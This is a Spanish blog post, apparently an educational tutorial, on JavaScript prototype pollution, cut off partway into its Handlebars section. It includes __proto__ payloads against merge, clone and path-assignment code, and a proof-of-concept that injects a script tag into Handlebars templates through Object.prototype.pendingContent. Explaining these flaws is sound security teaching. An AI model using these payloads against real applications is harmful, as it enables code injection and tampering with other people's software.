@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html lang="es">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="es">
+    <meta name="color-scheme" content="light dark">
+
+    
+
+    <meta name="author" content="LeVarez">
+    <meta name="description" content="Prototype PollutionPrimero de todo, qué és la contaminación prototype? Como puede comprometer la seguridad de nuestro sistema?
+Este tipo de ataque se lleva a cavo en el lenguage de programación JavaScript, ya que este mismo és prototype-based. Todos los nuevos objetos que se crean llevan las propiedades y mètodos del objeto prototype, el cual contiene funcionalidades bàsicas como toString(), constructor() y hasOwnProperty().
+Los atacantes puedes hacer uso de esta característica del lenguaje para poder hacer canvios a todos los objetos de la aplicación haciendo una modificación al objeto prtototype.">
+    <meta name="keywords" content="blog,developer,personal">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Prototype Pollution"/>
+<meta name="twitter:description" content="Prototype PollutionPrimero de todo, qué és la contaminación prototype? Como puede comprometer la seguridad de nuestro sistema?
+Este tipo de ataque se lleva a cavo en el lenguage de programación JavaScript, ya que este mismo és prototype-based. Todos los nuevos objetos que se crean llevan las propiedades y mètodos del objeto prototype, el cual contiene funcionalidades bàsicas como toString(), constructor() y hasOwnProperty().
+Los atacantes puedes hacer uso de esta característica del lenguaje para poder hacer canvios a todos los objetos de la aplicación haciendo una modificación al objeto prtototype."/>
+
+    <meta property="og:title" content="Prototype Pollution" />
+<meta property="og:description" content="Prototype PollutionPrimero de todo, qué és la contaminación prototype? Como puede comprometer la seguridad de nuestro sistema?
+Este tipo de ataque se lleva a cavo en el lenguage de programación JavaScript, ya que este mismo és prototype-based. Todos los nuevos objetos que se crean llevan las propiedades y mètodos del objeto prototype, el cual contiene funcionalidades bàsicas como toString(), constructor() y hasOwnProperty().
+Los atacantes puedes hacer uso de esta característica del lenguaje para poder hacer canvios a todos los objetos de la aplicación haciendo una modificación al objeto prtototype." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://LeVarez.github.io/posts/test1/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-12-08T12:37:40+01:00" />
+<meta property="article:modified_time" content="2021-12-08T12:37:40+01:00" />
+
+
+
+    <title>
+  Prototype Pollution · LeVarez
+</title>
+
+    
+      <link rel="canonical" href="https://LeVarez.github.io/posts/test1/">
+    
+
+    <link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.d9fddbffe6f27e69985dc5fe0471cdb0e57fbf4775714bc3d847accb08f4a1f6.css" integrity="sha256-2f3b/&#43;byfmmYXcX&#43;BHHNsOV/v0d1cUvD2Eesywj0ofY=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+      
+        
+        
+        <link rel="stylesheet" href="/css/coder-dark.min.ccbbada2e264e4fdbf9b2181cccc2cdb289a63dc9520a1e96ac2b9a45778df29.css" integrity="sha256-zLutouJk5P2/myGBzMws2yiaY9yVIKHpasK5pFd43yk=" crossorigin="anonymous" media="screen" />
+      
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+    <meta name="generator" content="Hugo 0.89.4" />
+  </head>
+
+  
+  
+    
+  
+  <body class="preload-transitions colorscheme-dark">
+    
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      LeVarez
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Blog</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://LeVarez.github.io/posts/test1/">
+              Prototype Pollution
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime='2021-12-08T12:37:40&#43;01:00'>
+                8 December de 2021
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              14 minutos de lectura.
+            </span>
+          </div>
+          <div class="authors">
+    <i class="fa fa-user" aria-hidden="true"></i>
+      <a href="/authors/levarez/">LeVarez</a></div>
+          
+          
+        </div>
+      </header>
+
+      <div>
+        
+        <h1 id="prototype-pollution">
+  Prototype Pollution
+  <a class="heading-link" href="#prototype-pollution">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>Primero de todo, qué és la contaminación prototype? Como puede comprometer la seguridad de nuestro sistema?</p>
+<p>Este tipo de ataque se lleva a cavo en el lenguage de programación JavaScript, ya que este mismo és prototype-based. Todos los nuevos objetos que se crean llevan las propiedades y mètodos del objeto prototype, el cual contiene funcionalidades bàsicas como <code>toString()</code>, <code>constructor()</code> y <code>hasOwnProperty()</code>.</p>
+<p>Los atacantes puedes hacer uso de esta característica del lenguaje para poder hacer canvios a todos los objetos de la aplicación haciendo una modificación al objeto prtototype. De aquí el nombre de prtotype pollution.</p>
+<p>Este objeto puede ser accedido desde cualquier otro objeto a través del atributo <code>__proto__</code>. Y una vez este objeto es modificado todos los objetos de l&rsquo;aplicación en marcha seràn modificados, tanto los que se creen de nuevo como los que ya estavan creados antes de la modificación<a href="https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications">[ 1 ]</a>.</p>
+<p>A continuación vamos a ver un pequeño ejemplo de como és el comportamiento.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">chocolate</span>  <span style="color:#f92672">=</span> {
+    <span style="color:#a6e22e">marca</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Chocolates LeVarez&#34;</span>
+    <span style="color:#a6e22e">precio</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span>
+};
+</code></pre></div><p>Si mostramos la salida de este objeto a través del mètodo <code>toString()</code> que viene predefinido en el objeto prototype podremos observar la siguiente salida:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">chocolate</span>.<span style="color:#a6e22e">toString</span>();
+<span style="color:#75715e">//Output: &#39;[object Object]&#39;
+</span></code></pre></div><p>Ahora a traves de otro objeto nuevo podemos modificar el comportamiento de la funcion <code>toString()</code>. Accederemos a el a través de la propiedad <code>__proto__</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">chocolateConLeche</span>  <span style="color:#f92672">=</span> {
+    <span style="color:#a6e22e">marca</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Chocolates LeVarez&#34;</span>,
+    <span style="color:#a6e22e">precio</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">3</span>
+};
+
+<span style="color:#a6e22e">chocolateConLeche</span>.<span style="color:#a6e22e">__proto__</span>.<span style="color:#a6e22e">toString</span> <span style="color:#f92672">=</span> () =&gt; <span style="color:#66d9ef">true</span>;
+
+<span style="color:#a6e22e">chocolate</span>.<span style="color:#a6e22e">toString</span>();
+<span style="color:#75715e">//Output: True
+</span></code></pre></div><p>Ahora se ha cambiado completamente el comportamiento de la función toString en todos los objetos del programa, de tener un valor de retorno una cadena de caràcteres (String) ahora tiene un valor Boolean. Si en nuestra aplicación se canvian los estos valores podria provocar un crasheo de la apliacion.</p>
+<p>Veamos que operaciones pueden influir en este tipo de ataques y que pasaria si un atacante pudiera modificar la propiedad property de un objeto. Según <code>Olivier Arteau</code> hay algunas operaciones conflictivas que permetirian la inserción de propiedades en este objeto. La operacion <code>merge(a,b)</code> puede ser peligrosa.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">chocolate</span>  <span style="color:#f92672">=</span> {
+    <span style="color:#a6e22e">promocion</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;50%&#34;</span>
+    <span style="color:#a6e22e">precio</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span>,
+};
+
+<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">chocolateConMiel</span>  <span style="color:#f92672">=</span> {
+    <span style="color:#a6e22e">precio</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">4</span>,
+    <span style="color:#a6e22e">extras</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;miel&#34;</span>
+};
+
+<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">chocolateFusionado</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">merge</span>(<span style="color:#a6e22e">chocolat</span>, <span style="color:#a6e22e">chocolateConMiel</span>);
+<span style="color:#75715e">/*Output
+</span><span style="color:#75715e">chocolateFusionado = {
+</span><span style="color:#75715e">    promocion: &#34;50%&#34;
+</span><span style="color:#75715e">    precio: 4,
+</span><span style="color:#75715e">    extras: &#34;miel&#34;
+</span><span style="color:#75715e">}
+</span><span style="color:#75715e">*/</span>
+</code></pre></div><p>Podemos observar que cuando 2 objetos comparten un mismo atributo el segundo tiene predominancia y sobrescribe el valor del primero. veamos la operacion merge:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">merge</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">a</span>, <span style="color:#a6e22e">b</span>) =&gt; {
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">attr</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">b</span>) {
+        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isObject</span>(<span style="color:#a6e22e">a</span>[<span style="color:#a6e22e">attr</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isObject</span>(<span style="color:#a6e22e">b</span>[<span style="color:#a6e22e">attr</span>])){
+            <span style="color:#a6e22e">merge</span>(<span style="color:#a6e22e">a</span>[<span style="color:#a6e22e">attr</span>], <span style="color:#a6e22e">b</span>[<span style="color:#a6e22e">attr</span>]);
+        } <span style="color:#66d9ef">else</span> {
+            <span style="color:#a6e22e">a</span>[<span style="color:#a6e22e">attr</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span>[<span style="color:#a6e22e">attr</span>];
+        }
+    }
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">a</span>;
+}
+</code></pre></div><p>La función recorre todos los atributos del objeto <code>b</code>, por cada atributo comprueba si el actual es un objecto y existe en los dos, si és asi hace una llamada recursiva de la misma función, si no, substituye o añade al objeto <code>a</code> el atributo actual. Finalmente devuelve el objeto <code>a</code>. Entonces si tenemos un objeto <code>b</code> cuyo valor és <code>{&quot;__proto__&quot;:{&quot;contaminado&quot;:&quot;estoy contaminado&quot;}}</code>. Si éste se aplica a la función merge puede contaminar todos los objetos que ya existen y a todos los futuros objetos que se creen.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">chocolate</span> <span style="color:#f92672">=</span> {
+    <span style="color:#a6e22e">precio</span><span style="color:#f92672">:</span>  <span style="color:#ae81ff">2</span>,
+}
+
+<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">contaminado</span> <span style="color:#f92672">=</span> {
+    <span style="color:#a6e22e">__proto__</span><span style="color:#f92672">:</span> {
+        <span style="color:#a6e22e">contaminado</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;estoy contaminado&#34;</span>
+    }
+}
+
+<span style="color:#a6e22e">merge</span>(<span style="color:#a6e22e">chocolate</span>, <span style="color:#a6e22e">contaminado</span>);
+
+<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">chocolateDelVacio</span> <span style="color:#f92672">=</span> {};
+
+<span style="color:#a6e22e">chocolateDelVacio</span>.<span style="color:#a6e22e">contaminado</span>;
+<span style="color:#75715e">//Output: &#39;estoy contaminado&#39;
+</span></code></pre></div><p>Otra operación muy frecuente que puede provocar el mismo efecto és la operación <code>clone(a)</code>. Si éste objecto se clona a través de la función ```merge({},a) también serà suceptible al prototype pollution.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">clone</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">a</span>) =&gt; {
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">merge</span>({}, <span style="color:#a6e22e">a</span>);
+}
+
+<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">contaminado</span> <span style="color:#f92672">=</span> {
+    <span style="color:#a6e22e">__proto__</span><span style="color:#f92672">:</span> {
+        <span style="color:#a6e22e">contaminado</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;estoy contaminado&#34;</span>
+    }
+}
+
+<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">chocolateClonado</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">clone</span>(<span style="color:#a6e22e">contaminado</span>);
+<span style="color:#a6e22e">chocolateClonado</span>.<span style="color:#a6e22e">contaminado</span>;
+<span style="color:#75715e">//Output: &#39;estoy contaminado&#39;
+</span></code></pre></div><p>Otra operación seria la de la assignación por ruta o path assignment. Donde algunas librerias nos permiten assignar un valora a una propiedad de un objecto a través de una ruta tal i como se puede ver a continuación, donde el primer paràmetro és el objeto, el segundo la ruta a la propiedad i el tercero el valor:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">chocolate</span>  <span style="color:#f92672">=</span> {
+    <span style="color:#a6e22e">precio</span><span style="color:#f92672">:</span> {
+        <span style="color:#a6e22e">precio</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1.5</span>,
+        <span style="color:#a6e22e">iva</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">47</span>
+    }
+};
+
+<span style="color:#a6e22e">setValue</span>(<span style="color:#a6e22e">chocolate</span>, <span style="color:#e6db74">&#34;precio.iva&#34;</span>, <span style="color:#ae81ff">0</span>);
+
+<span style="color:#a6e22e">chocolate</span>.<span style="color:#a6e22e">precio</span>.<span style="color:#a6e22e">iva</span>
+<span style="color:#75715e">//Output: 0
+</span></code></pre></div><p>Si los atacantes són capaces de controlar el paràmetro de ruta podrian introducir como ruta <code>__proto__.contaminado</code> y contaminar todos los objetos.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">chocolate</span>  <span style="color:#f92672">=</span> {
+    <span style="color:#a6e22e">precio</span><span style="color:#f92672">:</span> {
+        <span style="color:#a6e22e">precio</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1.5</span>,
+        <span style="color:#a6e22e">iva</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">47</span>
+    }
+};
+
+<span style="color:#a6e22e">setValue</span>(<span style="color:#a6e22e">chocolate</span>, <span style="color:#e6db74">&#34;__proto__.contaminado&#34;</span>, <span style="color:#e6db74">&#34;estoy contaminado&#34;</span>);
+
+<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">chocolateDelVacio</span> <span style="color:#f92672">=</span> {};
+<span style="color:#a6e22e">chocolateDelVacio</span>.<span style="color:#a6e22e">contaminado</span>
+<span style="color:#75715e">//Output: &#39;estoy contaminado&#39;
+</span></code></pre></div><p>Por lo que nunca debemos dar al usuario control absoluto de la entrada de la ruta. Visto todo esto cuáles són los possibles ataques que se podrian realizar a través de prototype pollution?</p>
+<p>Si pensamos, en muchos programas puede ser que haya una crida de todas propiedades de un objeto, que pasaría si una de estas propiedades fuera recursíva a si misma? Asi és! Stack Overflow!</p>
+<p>Como puede efectuar-se esto? bien, como hemos dicho todos los objetos se crean a partir del objeto prototype, por lo que si tiene una propiedad que si contaminamos con una propiedad que solo contenga un objeto vació éste se va a contener a sí mismo recursivamente.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">Object.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">nada</span> <span style="color:#f92672">=</span> {}
+({}).<span style="color:#a6e22e">nada</span>.<span style="color:#a6e22e">nada</span>.<span style="color:#a6e22e">nada</span>.<span style="color:#a6e22e">nada</span> <span style="color:#f92672">===</span> ({}).<span style="color:#a6e22e">nada</span>;
+</code></pre></div><p>Podemos observar que se puede ir llamando el objeto a si mismo sin limite. Entonces para poder añadir un objeto vacio sin que se llame recursivamente a si mismo lo que deberiamos hacer es crear un objeto con una propiedad que se llame igual que su propiedad i hacer a que apunta a &ldquo;nada&rdquo;. De tal forma que cuando se cree un objeto este no se podria llamar recursivamente<a href="https://www.youtube.com/watch?v=LUsiFV3dsK8&amp;ab_channel=NorthSec">[ 2 ]</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">Object.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">nada</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">nada</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>}
+({}).<span style="color:#a6e22e">nada</span>.<span style="color:#a6e22e">nada</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</code></pre></div><h1 id="ast">
+  AST
+  <a class="heading-link" href="#ast">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>Teniendo todo lo anterior en cuenta ahora vamos a ver los AST (Abstract node tree). Los AST són la representació de árbol de la estructura sintáctica simplificada del código fuente escrito en cierto lenguaje de programación. Los AST són utilizados muy a menudo en JavaScript como plantillas de motores, typescript&hellip;</p>
+<p>A continuación podemos ver como es el AST de nodeJS usando <code>handlebars</code>:</p>
+<p><img src="/nodejsast.png#center" alt="NodeJS AST"></p>
+<p>En la foto anterior podemos observar que nuestra plantilla de handlebars sigue una sèrie de passos hasta ser compilado. Tenemos nuestra plantilla que la passamos por un lexer. El lexer és una herramienta que se encarga de convertir el texto a una lista de tokens para processar posteriormente. Normalemente se usa para crear lenguajes de programación pero a veces tambien para el processamiento de texto entre otras cosas <a href="https://dev.to/areknawo/lexing-in-js-style--b5e">[ 3 ]</a>.</p>
+<p>Una vez tenemos los tokens el siguiente passo es el parser o analizador sintáctico. El parser és un programa que analiza una cadena de tokens según las reglas de la gramàtica del lenguaje. El parser convierte los tokens de entrada en otras estructuras (comunmente árboles). que són más útiles para el psoterior anàlisis ya que capturan la jerarquía de la entrada, estos són nombrados árboles de sintaxis abstracta.</p>
+<p>Veamos con un ejemplo fàcil como esto funciona. Imaginemos la entrada <code>12*(3+4)^2</code> de una calculadora. El lexer generaria los siguientes tokens <code>12, *, (, 3, +, 4, ), ^ y 2</code> (análisis léxico), el parser contendrà las reglas necesarias para indicar que los simbolos <code>*, (, +, ) y ^</code> indican el comienzo de un nuevo token. Lo siguiente és un análisis sintáctico para comprobar que el conjunto de tokens forman una expressión vàlida y por último queda el análisis sintàctico que evalua la expressión <a href="https://www.techopedia.com/definition/3854/parser">[ 4 ]</a><a href="https://es.wikipedia.org/wiki/Analizador_sint%C3%A1ctico">[ 5 ]</a>. Los siguientes pasos seria la compilación del AST a lenguaje máquina i la ejecución del código.</p>
+<p>Entonces a través de la propiedad prototype se podria insertar codigo durante las operaciones del Parser o del Compilador. En la imagen que se muestra a és un esquema del concepto de inserción de codigo a través de la contaminación del objecto prototype.</p>
+<p><img src="/nodejsastpolluted.png#center" alt="NodeJS AST Polluted"></p>
+<p>Podemos observar que a través de la contaminación prototype hemos contaminado el Parser y en consecuencia el AST ha sido alterado por lo que cuando el compilador procese el código se va a generar el codigo contaminado y por ende puede llegar a ejecutar comandas remotas. Hay algunas versiones conocidas de <code>handlebars</code> y <code>pug</code> que són vulnerables a este tipo de ataque. A continuación vamos a analizar porqué estas són vulnerables.</p>
+<p>Es interesante, en caso de que nuestro programa use handlebears o pug, poder detectar si estamos usando una versión vulnerable. Este fallo solo se encuentra en versiones anteriores, en las versiones más nuevas no se puede ejecutar comandos, incluso si alguna templete puede ser inserida de alguna forma.</p>
+<h1 id="handlebars">
+  Handlebars
+  <a class="heading-link" href="#handlebars">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>Para comprovar si nuestro programas es o no vulnerable a este tipo de ataques podemos ejectuar el siguiente codigo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">Handlebars</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;handlebars&#39;</span>);
+
+<span style="color:#75715e">/****************************************************************/</span>
+Object.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">pendingContent</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`&lt;script&gt;alert(&#34;Polluted&#34;)&lt;/script&gt;`</span>
+<span style="color:#75715e">/****************************************************************/</span>
+
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">source</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`Hello {{ msg }}`</span>;
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">template</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Handlebars</span>.<span style="color:#a6e22e">compile</span>(<span style="color:#a6e22e">source</span>);
+
+<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">template</span>({<span style="color:#e6db74">&#34;msg&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;posix&#34;</span>})); <span style="color:#75715e">// Hello posix
+</span></code></pre></div><p>Podemos inserir cualquier cadena de caracteres en <code>Object.prototype.pendingContent</code> para determinar si un ataque es possible.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#960050;background-color:#1e0010">/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js</span>
+
+...
+<span style="color:#a6e22e">appendContent</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">appendContent</span>(<span style="color:#a6e22e">content</span>) {
+	<span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">pendingContent</span>) {
+		<span style="color:#a6e22e">content</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">pendingContent</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">content</span>;
+	} <span style="color:#66d9ef">else</span> {
+		<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">pendingLocation</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">source</span>.<span style="color:#a6e22e">currentLocation</span>;
+	}
+
+	<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">pendingContent</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">content</span>;
+},
+<span style="color:#a6e22e">pushSource</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">pushSource</span>(<span style="color:#a6e22e">source</span>) {
+	<span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">pendingContent</span>) {
+		<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">source</span>.<span style="color:#a6e22e">push</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">appendToBuffer</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">source</span>.<span style="color:#a6e22e">quotedString</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">pendingContent</span>), <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">pendingLocation</span>));
+		<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">pendingContent</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">undefined</span>;
+	}
+
+	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">source</span>) {
+		<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">source</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">source</span>);
+	}
+}
+...
+</code></pre></div><p>Si observamos <code>appendContent</code> que està en el fitxero <code>javascript-compiler</code> podemos observar que lo que hace es comprovar si hay contenido pendiente, si és así ajunta el contenido pendiente con el contenido actual y guarda todo el el contenido a pending content. Posteriormente <code>pushSource</code> añade el contenido al buffer i pone pendingContent en <code>undefined</code> para prevenir multiples insersiones.</p>
+<p>Si recordamos el gràfico anterior donde se explicaba como funcionva el AST de nodeJS, teniamos el lexer i el parser que generaban el AST donde este posteriormente era enviado al compilador para ser ejecutado.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#960050;background-color:#1e0010">/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js</span>
+
+<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">36</span><span style="color:#f92672">:</span>
+    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">$</span> <span style="color:#f92672">=</span> {
+        <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;NumberLiteral&#39;</span>,
+        <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> Number(<span style="color:#a6e22e">$$</span>[<span style="color:#a6e22e">$0</span>]),
+        <span style="color:#a6e22e">original</span><span style="color:#f92672">:</span> Number(<span style="color:#a6e22e">$$</span>[<span style="color:#a6e22e">$0</span>]),
+        <span style="color:#a6e22e">loc</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">yy</span>.<span style="color:#a6e22e">locInfo</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_$</span>)
+    };
+    <span style="color:#66d9ef">break</span>;
+</code></pre></div><p>En handlebars el parser fuerza que todo valor del tipo NumberLiteral sea un number. Para convertir de NumberLiteral a number lo hace a través constructor tal i como se puede observar en el codigo anterior. El caso es que nosotros podemos inserir cualquier tipo de string utilizando la prototype pollution.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#960050;background-color:#1e0010">/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js</span>
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">parseWithoutProcessing</span>(<span style="color:#a6e22e">input</span>, <span style="color:#a6e22e">options</span>) {
+  <span style="color:#75715e">// Just return if an already-compiled AST was passed in.
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">input</span>.<span style="color:#a6e22e">type</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;Program&#39;</span>) {
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">input</span>;
+  }
+
+  <span style="color:#a6e22e">_parser2</span>[<span style="color:#e6db74">&#39;default&#39;</span>].<span style="color:#a6e22e">yy</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">yy</span>;
+
+  <span style="color:#75715e">// Altering the shared object here, but this is ok as parser is a sync operation
+</span><span style="color:#75715e"></span>  <span style="color:#a6e22e">yy</span>.<span style="color:#a6e22e">locInfo</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">locInfo</span>) {
